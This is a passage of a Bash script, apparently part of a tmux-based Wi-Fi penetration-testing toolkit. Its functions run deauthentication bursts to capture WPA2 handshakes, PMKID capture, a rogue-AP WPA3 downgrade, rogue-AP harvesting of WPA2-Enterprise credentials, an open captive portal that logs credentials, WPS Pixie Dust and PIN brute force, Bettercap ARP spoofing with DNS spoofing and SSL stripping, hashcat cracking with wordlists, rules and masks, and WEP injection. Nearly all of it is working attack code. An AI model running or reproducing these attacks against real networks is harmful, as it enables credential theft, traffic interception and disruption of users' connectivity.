    local out_dir="$2"
    local hash_file="${out_dir}/hashes.hc22000"

    [[ ! -f "$input_file" ]] && return 1
    local conv_err
    conv_err=$(hcxpcapngtool "$input_file" -o "$hash_file" 2>&1)

    if [[ -f "$hash_file" && -s "$hash_file" ]]; then
        hash_file "$hash_file"
        audit_log "HASHCAT hash file created: $hash_file"
        t_ok  "Hash file: $hash_file"
        t_cmd "hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt"
        t_cmd "hashcat -m 22000 hashes.hc22000 -a 3 ?u?l?l?l?d?d?d?d"
    else
        t_warn "hcxpcapngtool produced no output — capture may be incomplete."
        if [[ -n "$conv_err" ]]; then
            t_data "Converter output: $conv_err"
        fi
        t_data "Raw capture preserved: $input_file"
        t_data "Try manually: hcxpcapngtool '$input_file' -o hashes.hc22000"
        audit_log "HASHCAT CONVERSION FAILED: $conv_err"
    fi
}

# ════════════════════════════════════════════════════════════
#  TAB FUNCTIONS  — run inside their own tmux window
#  These use terminal output (t_ok/t_info/etc.), no dialog.
#
#  Each tab function that puts an interface in monitor mode
#  registers a local cleanup trap to restore it on Ctrl+C.
# ════════════════════════════════════════════════════════════

# Helper: install a local cleanup trap in a tab function.
# Usage: _tab_trap <mon_iface_varname> <...pids to kill...>
# Called immediately after monitor interface is established.
_tab_cleanup_on_signal() {
    local mon_ref="$1"; shift
    local pids=("$@")
    local mon_val="${!mon_ref}"
    t_warn "Interrupted — cleaning up ..."
    for p in "${pids[@]}"; do kill "$p" 2>/dev/null || true; done
    [[ -n "$mon_val" ]] && restore_single_interface "$mon_val"
    exit 0
}

tab_capture_handshake() {
    t_head "WPA2 Handshake Capture"
    t_data "Target  : $TARGET_SSID"
    t_data "BSSID   : $TARGET_BSSID"
    t_data "Channel : $TARGET_CHANNEL  ($(band_label))"
    t_data "Output  : ${OUTPUT_DIR}/$(band_label | tr ' ' '_')/"
    audit_log "HANDSHAKE START: target='$TARGET_SSID' bssid=$TARGET_BSSID ch=$TARGET_CHANNEL band=$(band_label) iface=$SELECTED_IFACE"
    _line
    # MFP warning: if AP requires MFP, deauth frames may be ignored
    if [[ -n "$AP_DB" && -f "$AP_DB" ]]; then
        local ap_mfp; ap_mfp=$(grep -v '^#' "$AP_DB" 2>/dev/null | grep "^${TARGET_BSSID}	" | head -1 | awk -F'\t' '{print $9}')
        if [[ "${ap_mfp,,}" == "required" ]]; then
            t_warn "MFP REQUIRED: This AP requires 802.11w Management Frame Protection."
            t_warn "Deauth frames will likely be IGNORED by MFP-protected clients."
            t_info "Recommendation: Use PMKID capture (menu item 4) instead."
        elif [[ "${ap_mfp,,}" == "capable" ]]; then
            t_info "MFP CAPABLE: AP supports 802.11w — some clients may ignore deauth."
        fi
    fi

    t_info "Enabling monitor mode on $SELECTED_IFACE ..."
    local mon; mon=$(put_in_monitor "$SELECTED_IFACE") || return 1
    t_ok  "Monitor interface: $mon"
    trap "_tab_cleanup_on_signal mon; exit 0" INT TERM

    local out_dir; out_dir=$(make_outdir "handshake")
    local cap_prefix="${out_dir}/capture"
    local cap_file="${cap_prefix}-01.cap"
    t_info "Output directory: $out_dir"

    # ── Lock monitor interface to target channel ────────────────
    # Prevents the interface from hopping away during deauth bursts.
    t_info "Locking $mon to channel $TARGET_CHANNEL ..."
    if iw dev "$mon" set channel "$TARGET_CHANNEL" 2>/dev/null; then
        t_ok "Channel locked: $TARGET_CHANNEL"
    else
        t_warn "iw channel lock failed — airodump-ng -c will handle it."
    fi

    t_info "Starting targeted capture ..."
    airodump-ng -c "$TARGET_CHANNEL" \
                --bssid "$TARGET_BSSID" \
                -w "$cap_prefix" \
                "$mon" &>/dev/null &
    local dump_pid=$!
    trap "_tab_cleanup_on_signal mon $dump_pid; exit 0" INT TERM
    t_ok "airodump-ng running (PID: $dump_pid)"
    sleep 2

    local found=0
    for attempt in $(seq 1 8); do
        t_info "Deauth burst — attempt $attempt/8 ..."
        aireplay-ng -0 5 -a "$TARGET_BSSID" "$mon" &>/dev/null
        sleep 4
        if [[ -f "$cap_file" ]]; then
            local n
            n=$(tshark -r "$cap_file" -Y eapol 2>/dev/null | wc -l)
            t_data "EAPOL frames: $n / 4 needed"
            if [[ $n -ge 4 ]]; then
                found=1
                break
            fi
        fi
    done

    kill "$dump_pid" 2>/dev/null || true
    _line

    # ── Aircrack-ng fallback verification ────────────────────────
    # tshark counts raw EAPOL frames; aircrack-ng verifies a USABLE handshake
    # (needs msgs 1+2 or 2+3 of the 4-way exchange). Run regardless of $found.
    if [[ -f "$cap_file" ]]; then
        local ac_out
        ac_out=$(aircrack-ng -a2 "$cap_file" 2>&1 | grep -E "handshake|BSSID" | head -3 || true)
        if echo "$ac_out" | grep -qi "handshake"; then
            found=1
            t_ok "aircrack-ng confirms a usable handshake in the capture."
        fi
    fi

    if [[ $found -eq 1 ]]; then
        t_ok "HANDSHAKE CAPTURED!"
        hash_file "$cap_file"
        audit_log "HANDSHAKE CAPTURED: output=$cap_file"
        t_info "Converting to hashcat format ..."
        convert_to_hashcat "$cap_file" "$out_dir"
    else
        t_warn "No usable handshake after 8 deauth attempts."
        t_data "Raw capture preserved: $cap_file"
        t_data "The file may still be usable — try:"
        t_cmd  "aircrack-ng \"$cap_file\""
        t_cmd  "hcxpcapngtool \"$cap_file\" -o hashes.hc22000"
        audit_log "HANDSHAKE FAILED: no 4-way handshake after 8 deauth bursts, target=$TARGET_SSID"
    fi

    restore_single_interface "$mon"
    audit_log "HANDSHAKE END: target='$TARGET_SSID'"
}

tab_deauth() {
    local count="${TAB_DEAUTH_COUNT:-10}"
    local client="${TAB_DEAUTH_CLIENT:-}"
    local mode; [[ -n "$client" ]] && mode="Targeted ($client)" || mode="Broadcast (all clients)"

    t_head "Deauthentication Attack"
    t_data "Target   : $TARGET_SSID"
    t_data "BSSID    : $TARGET_BSSID"
    t_data "Channel  : $TARGET_CHANNEL"
    t_data "Mode     : $mode"
    local frames_label; [[ "$count" == "0" ]] && frames_label="0 (continuous)" || frames_label="$count"
    t_data "Frames   : $frames_label"
    audit_log "DEAUTH START: target='$TARGET_SSID' bssid=$TARGET_BSSID ch=$TARGET_CHANNEL client='${client:-broadcast}' count=$count iface=$SELECTED_IFACE"
    _line

    # MFP check — deauth frames are ignored by MFP-required clients
    if [[ -n "$AP_DB" && -f "$AP_DB" ]]; then
        local ap_mfp
        ap_mfp=$(grep -v '^#' "$AP_DB" 2>/dev/null | grep "^${TARGET_BSSID}	" | \
                 head -1 | awk -F'\t' '{print $9}')
        if [[ "${ap_mfp,,}" == "required" ]]; then
            t_warn "MFP REQUIRED: This AP enforces 802.11w Management Frame Protection."
            t_warn "Deauth frames will be IGNORED by protected clients."
            t_info "Tip: Try PMKID capture instead (menu item 4)."
        elif [[ "${ap_mfp,,}" == "capable" ]]; then
            t_info "MFP CAPABLE: Some clients may ignore deauth frames."
        fi
    fi

    t_info "Enabling monitor mode on $SELECTED_IFACE ..."
    local mon; mon=$(put_in_monitor "$SELECTED_IFACE") || return 1
    t_ok  "Monitor interface: $mon"
    trap "_tab_cleanup_on_signal mon; exit 0" INT TERM

    t_info "Locking $mon to channel $TARGET_CHANNEL ..."
    iw dev "$mon" set channel "$TARGET_CHANNEL" 2>/dev/null || true

    # Build aireplay-ng command
    local -a deauth_cmd=( aireplay-ng -0 "$count" -a "$TARGET_BSSID" )
    [[ -n "$client" ]] && deauth_cmd+=( -c "$client" )
    deauth_cmd+=( "$mon" )

    if [[ "$count" -eq 0 ]]; then
        t_warn "Continuous mode — press Ctrl+C to stop."
        t_cmd "${deauth_cmd[*]}"
        "${deauth_cmd[@]}"
    else
        t_info "Sending $count deauth frames ..."
        t_cmd "${deauth_cmd[*]}"
        "${deauth_cmd[@]}" 2>&1 | while IFS= read -r line; do
            t_data "$line"
        done
        t_ok "Deauth burst complete."
        t_info "Switch to the Handshake Capture tab to check for EAPOLs."
    fi

    _line
    audit_log "DEAUTH END: target='$TARGET_SSID' client='${client:-broadcast}' count=$count"
    restore_single_interface "$mon"
}

tab_pmkid_capture() {
    t_head "PMKID Clientless Capture"
    t_data "Target  : $TARGET_SSID"
    t_data "BSSID   : $TARGET_BSSID"
    t_data "Timeout : ${TAB_TIMEOUT}s"
    t_data "Band    : $(band_label)"
    t_data "Output  : ${OUTPUT_DIR}/$(band_label | tr ' ' '_')/"
    audit_log "PMKID START: target='$TARGET_SSID' bssid=$TARGET_BSSID timeout=${TAB_TIMEOUT}s band=$(band_label) iface=$SELECTED_IFACE"
    _line

    t_info "Enabling monitor mode on $SELECTED_IFACE ..."
    local mon; mon=$(put_in_monitor "$SELECTED_IFACE") || return 1
    t_ok  "Monitor interface: $mon"
    trap "_tab_cleanup_on_signal mon; exit 0" INT TERM

    local out_dir; out_dir=$(make_outdir "pmkid")
    local pcapng="${out_dir}/pmkid.pcapng"
    local filter_file="${TMPDIR_PT}/bssid_filter_$$.txt"
    echo "${TARGET_BSSID,,}" > "$filter_file"
    t_info "Output directory: $out_dir"

    # ── Lock monitor interface to target channel ────────────────
    # hcxdumptool does not accept a --band or --channel flag;
    # we must set the channel via iw before launching it so the
    # interface does not hop away from the target AP.
    if [[ -n "$TARGET_CHANNEL" ]]; then
        t_info "Locking $mon to channel $TARGET_CHANNEL ..."
        if ! iw dev "$mon" set channel "$TARGET_CHANNEL" 2>/dev/null; then
            t_warn "Could not lock channel — iw dev set channel failed."
            t_data "hcxdumptool will still run but may miss PMKID if hopping."
        else
            t_ok "Channel locked: $TARGET_CHANNEL"
        fi
    else
        t_warn "No target channel set — interface will hop freely."
        t_data "Tip: Run Scan first to set a target, then launch PMKID."
    fi

    t_info "Launching hcxdumptool (BSSID-filtered) ..."
    hcxdumptool -i "$mon" \
                --enable_status=1 \
                --filterlist_ap="$filter_file" \
                --filtermode=2 \
                -o "$pcapng" &>/dev/null &
    local hcx_pid=$!
    trap "_tab_cleanup_on_signal mon $hcx_pid; exit 0" INT TERM
    t_ok "hcxdumptool running (PID: $hcx_pid)"

    for i in $(seq 1 "$TAB_TIMEOUT"); do
        printf "\r${AM}  [>]${NC} Capturing ... ${WH}%d${NC}/${TAB_TIMEOUT}s" "$i"
        sleep 1
    done
    echo

    kill "$hcx_pid" 2>/dev/null || true
    sleep 1
    _line

    if [[ -f "$pcapng" && -s "$pcapng" ]]; then
        t_ok "Capture saved: $pcapng"
        hash_file "$pcapng"
        audit_log "PMKID CAPTURED: output=$pcapng"
        t_info "Converting to hashcat format ..."
        convert_to_hashcat "$pcapng" "$out_dir"
    else
        t_warn "No PMKID data captured."
        t_data "AP may not respond to PMKID requests."
        t_data "Try the Handshake Capture method instead."
        audit_log "PMKID FAILED: no data captured, target=$TARGET_SSID"
    fi

    restore_single_interface "$mon"
    audit_log "PMKID END: target='$TARGET_SSID'"
}

tab_eaphammer_downgrade() {
    t_head "EAPHammer — WPA3 to WPA2 Downgrade"
    [[ -z "$EAPHAMMER" ]] && { t_err "eaphammer not found. Run: sudo bash install.sh"; return 1; }
    t_data "Target  : $TARGET_SSID"
    t_data "BSSID   : $TARGET_BSSID"
    t_data "Channel : $TARGET_CHANNEL"
    t_data "Iface   : $SELECTED_IFACE"
    audit_log "DOWNGRADE START: target='$TARGET_SSID' bssid=$TARGET_BSSID ch=$TARGET_CHANNEL iface=$SELECTED_IFACE"
    _line

    local out_dir; out_dir=$(make_outdir "downgrade")
    local log_file="${out_dir}/downgrade.log"

    t_info "Launching rogue WPA2 AP (PSK mode) ..."
    t_warn "WPA3 clients will be forced to downgrade."

    "$EAPHAMMER" \
        -i "$SELECTED_IFACE" \
        --channel "$TARGET_CHANNEL" \
        --essid "$TARGET_SSID" \
        --bssid "$TARGET_BSSID" \
        --auth wpa-psk \
        --wpa 2 \
        --psk "$TAB_ROGUE_PSK" \
        2>&1 | tee "$log_file"

    _line
    local cap_file
    cap_file=$(find "$out_dir" -name "*.cap" -o -name "*.pcapng" 2>/dev/null | head -1)
    if [[ -n "$cap_file" ]]; then
        t_ok "Capture found. Converting to hashcat format ..."
        hash_file "$cap_file"
        audit_log "DOWNGRADE CAPTURE: $cap_file"
        convert_to_hashcat "$cap_file" "$out_dir"
    else
        t_warn "No capture file found. Check log: $log_file"
    fi
    audit_log "DOWNGRADE END: target='$TARGET_SSID' log=$log_file"
}

tab_eaphammer_enterprise() {
    t_head "EAPHammer — WPA2-Enterprise EAP Credential Harvest"
    [[ -z "$EAPHAMMER" ]] && { t_err "eaphammer not found. Run: sudo bash install.sh"; return 1; }
    t_data "Target    : $TARGET_SSID"
    t_data "Channel   : $TARGET_CHANNEL"
    t_data "Negotiate : $TAB_NEGOTIATE"
    t_data "WPA       : v${TAB_WPA_VER}"
    t_data "Cap HS    : $TAB_CAP_HS"
    t_data "Cert      : $EAP_ACTIVE_CERT"
    if [[ "$TAB_NEGOTIATE" == "manual" ]]; then
        t_data "Phase 1   : ${TAB_PHASE1:-PEAP,TTLS,TLS,FAST}"
        t_data "Phase 2   : ${TAB_PHASE2:-GTC,MSCHAPV2}"
    fi
    audit_log "ENTERPRISE START: target='$TARGET_SSID' ch=$TARGET_CHANNEL negotiate=$TAB_NEGOTIATE iface=$SELECTED_IFACE"
    _line

    local out_dir; out_dir=$(make_outdir "enterprise")
    local log_file="${out_dir}/eap_creds.log"
    local loot_dir="/var/lib/eaphammer/loot"

    t_info "Starting rogue WPA2-Enterprise AP ..."
    t_info "Cert profile loaded — wizard settings applied."

    # Build optional phase-method args for manual negotiation
    local -a eap_extra=()
    if [[ "$TAB_NEGOTIATE" == "manual" ]]; then
        [[ -n "$TAB_PHASE1" ]] && eap_extra+=(--phase1-methods "$TAB_PHASE1")
        [[ -n "$TAB_PHASE2" ]] && eap_extra+=(--phase2-methods "$TAB_PHASE2")
    fi

    "$EAPHAMMER" \
        -i "$SELECTED_IFACE" \
        --channel "$TARGET_CHANNEL" \
        --essid "$TARGET_SSID" \
        --auth wpa-eap \
        --wpa-version "$TAB_WPA_VER" \
        --negotiate "$TAB_NEGOTIATE" \
        --capture-wpa-handshakes "$TAB_CAP_HS" \
        "${eap_extra[@]}" \
        --creds \
        2>&1 | tee "$log_file"

    _line
    t_ok  "Session complete."
    t_data "Log file : $log_file"
    t_data "Loot dir : $loot_dir"
    t_cmd "hashcat -m 5600 $log_file /usr/share/wordlists/rockyou.txt"
    hash_file "$log_file"
    audit_log "ENTERPRISE END: target='$TARGET_SSID' log=$log_file loot=$loot_dir"
}

tab_captive_portal() {
    t_head "EAPHammer — Captive Portal (Open AP)"
    [[ -z "$EAPHAMMER" ]] && { t_err "eaphammer not found. Run: sudo bash install.sh"; return 1; }
    t_data "SSID    : $TAB_PORTAL_SSID"
    t_data "Channel : $TAB_PORTAL_CHANNEL"
    t_data "Iface   : $SELECTED_IFACE"
    audit_log "PORTAL START: ssid='$TAB_PORTAL_SSID' ch=$TAB_PORTAL_CHANNEL iface=$SELECTED_IFACE"
    _line

    local safe="${TAB_PORTAL_SSID//[^a-zA-Z0-9_-]/_}"
    local ts; ts=$(date +%Y%m%d_%H%M%S)
    local out_dir="${OUTPUT_DIR}/${safe}_portal_${ts}"
    mkdir -p "$out_dir"
    local log_file="${out_dir}/captive_creds.log"

    t_info "Launching open AP with captive portal ..."
    t_warn "Credentials will be logged to: $log_file"

    "$EAPHAMMER" \
        -i "$SELECTED_IFACE" \
        --channel "$TAB_PORTAL_CHANNEL" \
        --essid "$TAB_PORTAL_SSID" \
        --auth open \
        --captive-portal \
        2>&1 | tee "$log_file"

    _line
    t_ok  "Session complete."
    t_data "Credentials log: $log_file"
    hash_file "$log_file"
    audit_log "PORTAL END: ssid='$TAB_PORTAL_SSID' log=$log_file"
}

tab_wps_attack() {
    t_head "WPS Attack — Pixie Dust / PIN Brute-Force"
    t_data "Target  : $TARGET_SSID"
    t_data "BSSID   : $TARGET_BSSID"
    t_data "Channel : $TARGET_CHANNEL"
    t_data "Method  : $TAB_WPS_METHOD"
    audit_log "WPS START: target='$TARGET_SSID' bssid=$TARGET_BSSID method=$TAB_WPS_METHOD"
    _line

    local out_dir; out_dir=$(make_outdir "wps")
    local log_file="${out_dir}/wps.log"

    t_info "Enabling monitor mode on $SELECTED_IFACE ..."
    local mon; mon=$(put_in_monitor "$SELECTED_IFACE") || return 1
    t_ok  "Monitor interface: $mon"
    trap "_tab_cleanup_on_signal mon; exit 0" INT TERM

    # ── Confirm WPS status with wash ─────────────────────────────
    if command -v wash &>/dev/null; then
        t_info "Scanning for WPS beacons with wash (~12s) ..."
        local wash_out
        wash_out=$(timeout 12 wash -i "$mon" 2>/dev/null \
                   | grep -v "^$\|^Waiting\|^BSSID\|^---" || true)
        if [[ -n "$wash_out" ]]; then
            while IFS= read -r line; do t_data "$line"; done <<< "$wash_out"
            if echo "$wash_out" | grep -qi "${TARGET_BSSID}"; then
                local wps_lck
                wps_lck=$(echo "$wash_out" | grep -i "${TARGET_BSSID}" \
                          | awk '{print $5}' | head -1)
                if [[ "${wps_lck^^}" == "YES" ]]; then
                    t_warn "WPS is LOCKED on this AP — Pixie Dust may still work offline."
                else
                    t_ok  "WPS confirmed UNLOCKED on target."
                fi
            else
                t_warn "Target BSSID not seen in WPS scan — WPS may be disabled."
                t_warn "Proceeding anyway in case wash missed it."
            fi
        else
            t_warn "No WPS beacons received."
        fi
        _line
    fi

    # ── Execute chosen attack method ─────────────────────────────
    local reaver_bin bully_bin
    reaver_bin=$(command -v reaver 2>/dev/null || echo "")
    bully_bin=$(command -v bully  2>/dev/null || echo "")

    case "$TAB_WPS_METHOD" in
        pixiedust)
            t_info "Pixie Dust attack — offline, fast on vulnerable chipsets."
            t_info "Vulnerable: Broadcom, Ralink/MediaTek, Realtek chipsets."
            if [[ -n "$reaver_bin" ]]; then
                t_cmd "reaver -i $mon -b $TARGET_BSSID -c $TARGET_CHANNEL -K 1 -vv"
                reaver -i "$mon" -b "$TARGET_BSSID" \
                       -c "$TARGET_CHANNEL" -K 1 -vv \
                       2>&1 | tee "$log_file"
            else
                t_err "reaver not found.  Install: apt install reaver"
            fi
            ;;

        bruteforce)
            t_warn "Full PIN brute-force — may take hours. Rate limiting is common."
            if [[ -n "$reaver_bin" ]]; then
                t_cmd "reaver -i $mon -b $TARGET_BSSID -c $TARGET_CHANNEL --no-nacks -vv"
                reaver -i "$mon" -b "$TARGET_BSSID" \
                       -c "$TARGET_CHANNEL" --no-nacks -vv \
                       2>&1 | tee "$log_file"
            elif [[ -n "$bully_bin" ]]; then
                t_info "Falling back to bully ..."
                t_cmd "bully -b $TARGET_BSSID -c $TARGET_CHANNEL -v 3 $mon"
                bully -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
                      -v 3 "$mon" \
                      2>&1 | tee "$log_file"
            else
                t_err "Neither reaver nor bully found.  Install: apt install reaver bully"
            fi
            ;;

        pin)
            t_info "Testing specific WPS PIN: $TAB_WPS_PIN"
            if [[ -n "$reaver_bin" ]]; then
                t_cmd "reaver -i $mon -b $TARGET_BSSID -c $TARGET_CHANNEL -p $TAB_WPS_PIN -vv"
                reaver -i "$mon" -b "$TARGET_BSSID" \
                       -c "$TARGET_CHANNEL" -p "$TAB_WPS_PIN" -vv \
                       2>&1 | tee "$log_file"
            else
                t_err "reaver not found.  Install: apt install reaver"
            fi
            ;;
    esac

    _line
    # ── Parse result ──────────────────────────────────────────────
    local cracked
    cracked=$(grep -iE "WPS PIN|PSK|Key Cracked|password" "$log_file" 2>/dev/null | tail -5)
    if [[ -n "$cracked" ]]; then
        t_ok "SUCCESS — WPS/PSK recovered:"
        while IFS= read -r line; do t_data "  $line"; done <<< "$cracked"
        hash_file "$log_file"
        audit_log "WPS SUCCESS: PSK recovered for target='$TARGET_SSID'"
    else
        t_warn "No PSK recovered. Full log: $log_file"
        audit_log "WPS FAILED: no PSK recovered, target=$TARGET_SSID"
    fi

    restore_single_interface "$mon"
    audit_log "WPS END: target='$TARGET_SSID' log=$log_file"
}

tab_bettercap_mitm() {
    t_head "Bettercap — Network MITM"
    t_data "Interface : $SELECTED_IFACE"
    t_data "Gateway   : ${TAB_MITM_GW:-auto-detect}"
    t_data "Targets   : ${TAB_MITM_TARGETS:-all clients}"
    t_data "DNS Spoof : $TAB_MITM_DNS"
    t_data "SSL Strip : $TAB_MITM_SSL"
    audit_log "MITM START: iface=$SELECTED_IFACE gw=${TAB_MITM_GW:-auto} targets=${TAB_MITM_TARGETS:-all}"
    _line

    local out_dir
    out_dir="${OUTPUT_DIR}/mitm_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$out_dir"
    local sniff_log="${out_dir}/sniff.log"
    local bc_log="${out_dir}/bettercap.log"
    local caplet="${TMPDIR_PT}/mitm_$$.cap"

    # ── Enable IP forwarding ──────────────────────────────────────
    local old_fwd
    old_fwd=$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null || echo 0)
    echo 1 > /proc/sys/net/ipv4/ip_forward
    t_ok "IP forwarding enabled (was: $old_fwd)."
    # Restore IP forwarding on Ctrl+C / signal so ARP tables recover
    trap "echo '$old_fwd' > /proc/sys/net/ipv4/ip_forward; t_ok 'IP forwarding restored.'; exit 0" INT TERM

    # ── Auto-detect gateway ───────────────────────────────────────
    local gw="$TAB_MITM_GW"
    if [[ -z "$gw" ]]; then
        gw=$(ip route show dev "$SELECTED_IFACE" 2>/dev/null \
             | awk '/default/{print $3; exit}')
        [[ -z "$gw" ]] && gw=$(ip route 2>/dev/null | awk '/default/{print $3; exit}')
        [[ -n "$gw" ]] && t_ok "Auto-detected gateway: $gw"
    fi
    [[ -z "$gw" ]] && t_warn "Could not detect gateway — ARP spoof may be incomplete."

    # ── Write bettercap caplet ────────────────────────────────────
    {
        echo "set arp.spoof.fullduplex true"
        [[ -n "$TAB_MITM_TARGETS" ]] && echo "set arp.spoof.targets $TAB_MITM_TARGETS"
        echo "arp.spoof on"
        echo "set net.sniff.output $sniff_log"
        echo "set net.sniff.verbose false"
        echo "net.sniff on"
        if [[ "$TAB_MITM_DNS" == "yes" ]]; then
            echo "set dns.spoof.all true"
            echo "dns.spoof on"
        fi
        if [[ "$TAB_MITM_SSL" == "yes" ]]; then
            echo "set http.proxy.sslstrip true"
            echo "http.proxy on"
        fi
    } > "$caplet"

    t_info "Starting ARP spoof + credential capture ..."
    [[ -n "$gw" ]] && t_data "Gateway : $gw"
    t_data "Sniff log : $sniff_log"
    t_warn "Ctrl+C to stop and restore ARP tables."
    _line

    bettercap -iface "$SELECTED_IFACE" -caplet "$caplet" 2>&1 | tee "$bc_log"

    # ── Restore IP forwarding ─────────────────────────────────────
    echo "$old_fwd" > /proc/sys/net/ipv4/ip_forward
    t_ok "IP forwarding restored to: $old_fwd"

    _line
    hash_file "$sniff_log"
    audit_log "MITM END: iface=$SELECTED_IFACE sniff=$sniff_log"

    if [[ -f "$sniff_log" && -s "$sniff_log" ]]; then
        t_ok "Captured data saved: $sniff_log"
        t_info "Last 20 lines of capture:"
        tail -20 "$sniff_log" | while IFS= read -r line; do t_data "$line"; done
    else
        t_warn "Sniff log is empty — no credentials captured."
    fi
}

tab_hashcat_crack() {
    t_head "Hashcat — Offline Password Cracking"
    t_data "Hash File : $TAB_HC_FILE"
    t_data "Hash Type : $TAB_HC_HASH_TYPE  (22000=WPA2, 5600=MSCHAPv2)"
    t_data "Wordlist  : $TAB_HC_WORDLIST"
    t_data "Mode      : $TAB_HC_MODE"
    audit_log "HASHCAT START: file=$TAB_HC_FILE type=$TAB_HC_HASH_TYPE mode=$TAB_HC_MODE"
    _line

    if [[ ! -f "$TAB_HC_FILE" ]]; then
        t_err "Hash file not found: $TAB_HC_FILE"
        return 1
    fi

    local out_dir
    out_dir=$(dirname "$TAB_HC_FILE")
    local pot_file="${out_dir}/hashcat.pot"
    local hc_base_args=(-m "$TAB_HC_HASH_TYPE" "$TAB_HC_FILE"
                        --potfile-path "$pot_file"
                        --status --status-timer=15)

    # ── Phase 1: Wordlist ─────────────────────────────────────────
    if [[ "$TAB_HC_MODE" == "wordlist" || "$TAB_HC_MODE" == "full" ]]; then
        t_info "Phase 1/3 — Wordlist attack ..."
        t_cmd "hashcat -m $TAB_HC_HASH_TYPE $TAB_HC_FILE $TAB_HC_WORDLIST"
        if [[ -f "$TAB_HC_WORDLIST" ]]; then
            hashcat "${hc_base_args[@]}" "$TAB_HC_WORDLIST" 2>&1 || true
        else
            t_warn "Wordlist not found: $TAB_HC_WORDLIST"
        fi
        _line
    fi

    # ── Phase 2: Rules-based ──────────────────────────────────────
    if [[ "$TAB_HC_MODE" == "rules" || "$TAB_HC_MODE" == "full" ]]; then
        t_info "Phase 2/3 — Rule mutations (best64.rule) ..."
        local rules_file="/usr/share/hashcat/rules/best64.rule"
        if [[ -f "$rules_file" && -f "$TAB_HC_WORDLIST" ]]; then
            t_cmd "hashcat -m $TAB_HC_HASH_TYPE $TAB_HC_FILE $TAB_HC_WORDLIST -r best64.rule"
            hashcat "${hc_base_args[@]}" "$TAB_HC_WORDLIST" -r "$rules_file" 2>&1 || true
        else
            t_warn "Skipping rules: wordlist or best64.rule not found."
        fi
        _line
    fi

    # ── Phase 3: Common mask patterns ────────────────────────────
    if [[ "$TAB_HC_MODE" == "mask" || "$TAB_HC_MODE" == "full" ]]; then
        t_info "Phase 3/3 — Common mask patterns ..."
        local masks=(
            "?u?l?l?l?d?d?d?d"   # e.g. Pass1234
            "?u?l?l?l?l?l?d?d"   # e.g. Passwd12
            "?d?d?d?d?d?d?d?d"   # e.g. 12345678
            "?l?l?l?l?d?d?d?d"   # e.g. home2024
            "?u?l?l?l?l?d?d?d"   # e.g. Admin123
        )
        for mask in "${masks[@]}"; do
            t_cmd "hashcat -m $TAB_HC_HASH_TYPE $TAB_HC_FILE -a 3 $mask"
            hashcat "${hc_base_args[@]}" -a 3 "$mask" 2>&1 || true
        done
        _line
    fi

    # ── Show results ──────────────────────────────────────────────
    t_ok "Cracking session complete."
    if [[ -f "$pot_file" && -s "$pot_file" ]]; then
        local cracked_count
        cracked_count=$(wc -l < "$pot_file")
        t_ok "CRACKED: $cracked_count password(s) recovered:"
        local first_pass=""
        while IFS=: read -r _hash pass; do
            t_data "  Password: ${pass}"
            [[ -z "$first_pass" ]] && first_pass="$pass"
        done < "$pot_file"
        audit_log "HASHCAT CRACKED: $cracked_count passwords from $TAB_HC_FILE"
        # Save first cracked password for PSK verification
        if [[ -n "$first_pass" ]]; then
            local crack_dir; crack_dir=$(dirname "$TAB_HC_FILE")
            printf '%s\n' "$first_pass" > "${crack_dir}/cracked_psk.txt"
            t_ok "Cracked PSK saved: ${crack_dir}/cracked_psk.txt"
            t_info "Use menu item 17 to verify PSK connectivity."
        fi
    else
        t_warn "No passwords cracked with selected wordlist/masks."
        t_info "Try a larger wordlist or different mask pattern."
        audit_log "HASHCAT DONE: no passwords cracked, file=$TAB_HC_FILE"
    fi
    t_data "Pot file: $pot_file"
}

# ════════════════════════════════════════════════════════════
#  FEATURE 13 — WEP ATTACK SUITE TAB
# ════════════════════════════════════════════════════════════

tab_wep_attack() {
    t_head "WEP Attack Suite"
    t_data "Target   : $TARGET_SSID"
    t_data "BSSID    : $TARGET_BSSID"
    t_data "Channel  : $TARGET_CHANNEL"
    t_data "Method   : $TAB_WEP_METHOD"
    t_data "IV Goal  : $TAB_WEP_IV_THRESHOLD"
    audit_log "WEP START: target='$TARGET_SSID' bssid=$TARGET_BSSID method=$TAB_WEP_METHOD"
    _line

    t_info "Enabling monitor mode on $SELECTED_IFACE ..."
    local mon; mon=$(put_in_monitor "$SELECTED_IFACE") || return 1
    t_ok  "Monitor interface: $mon"
    trap "_tab_cleanup_on_signal $mon; exit 0" INT TERM

    local out_dir; out_dir=$(make_outdir "wep")
    t_info "Output directory: $out_dir"

    # Start capture
    t_info "Starting airodump-ng capture ..."
    airodump-ng --bssid "$TARGET_BSSID" \
                --channel "$TARGET_CHANNEL" \
                -w "${out_dir}/cap" \
                "$mon" &>/dev/null &
    local dump_pid=$!
    trap "_tab_cleanup_on_signal $mon $dump_pid; exit 0" INT TERM
    sleep 2

    # Fake authentication
    t_info "Performing fake authentication ..."
    aireplay-ng -1 0 -a "$TARGET_BSSID" "$mon" 2>&1 | while IFS= read -r line; do
        t_data "$line"
    done

    # Select injection method
    _wep_inject() {
        local method="$1"
        case "$method" in
            arp)
                t_info "Starting ARP replay injection ..."
                aireplay-ng -3 -b "$TARGET_BSSID" "$mon" &
                echo $!
                ;;
            frag)
                t_info "Starting fragmentation attack ..."
                aireplay-ng -5 -b "$TARGET_BSSID" "$mon" &
                local frag_pid=$!
                sleep 10
                local xor_file; xor_file=$(ls -t /tmp/fragment-*.xor 2>/dev/null | head -1)
                if [[ -n "$xor_file" ]]; then
                    t_info "Forging ARP packet with packetforge-ng ..."
                    packetforge-ng -0 -a "$TARGET_BSSID" -k 255.255.255.255 \
                                   -l 255.255.255.255 -y "$xor_file" \
                                   -w /tmp/wep_forged.cap &>/dev/null
                    t_info "Replaying forged packet ..."
                    aireplay-ng -2 -r /tmp/wep_forged.cap "$mon" &
                    echo $!
                else
                    t_warn "No XOR file produced by fragmentation attack."
                    kill "$frag_pid" 2>/dev/null || true
                    echo ""
                fi
                ;;
            chopchop)
                t_info "Starting chopchop attack ..."
                aireplay-ng -4 -b "$TARGET_BSSID" "$mon" &
                local cc_pid=$!
                sleep 10
                local xor_file; xor_file=$(ls -t /tmp/replay_dec-*.xor 2>/dev/null | head -1)
                if [[ -n "$xor_file" ]]; then
                    t_info "Forging ARP packet with packetforge-ng ..."
                    packetforge-ng -0 -a "$TARGET_BSSID" -k 255.255.255.255 \
                                   -l 255.255.255.255 -y "$xor_file" \
                                   -w /tmp/wep_forged.cap &>/dev/null
                    t_info "Replaying forged packet ..."
